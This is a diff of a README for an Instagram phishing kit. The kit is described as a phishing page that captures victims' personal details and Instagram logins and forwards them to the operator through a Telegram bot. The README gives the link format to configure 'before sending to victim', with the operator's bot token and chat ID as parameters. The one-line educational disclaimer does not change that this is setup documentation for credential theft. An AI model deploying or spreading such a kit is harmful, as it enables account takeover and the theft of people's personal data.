@@ -1,14 +1,14 @@
-# 🚨 Instagram Phishing Telegram Bot  
+🚨 Instagram Phishing Telegram Bot  
 
-🔥 **My Social Engineering & Phishing Project: How Attackers Exploit Social Engineering**  
+🔥 My Social Engineering & Phishing Project: How Attackers Exploit Social Engineering**  
 
 Only For Educational Purpose ♥️
 
 ---
 
-## 📌 What I Built  
+📌 What I Built  
 
-To demonstrate **real-world attack scenarios**, I created a **phishing page** that integrates with the **Telegram API** to capture and send:  
+To demonstrate real-world attack scenarios, I created a phishing page that integrates with the Telegram API to capture and send:  
 
 ✅ **Personal details**  
 ✅ **Instagram logins**  
@@ -22,7 +22,7 @@ This project helps in understanding how phishing attacks work and how attackers 
 ## 🛠️ How It Works  
 
 Url Format Before Sending to Victim : 
-www.example.com/?bt=123456:ABCDEF&id=987654321
+www.example.com/?bt=YOUR_BOT_TOKEN&id=YOUR_CHAT_ID
 
 bt = your telegram bot token
 id = your telegram chat id
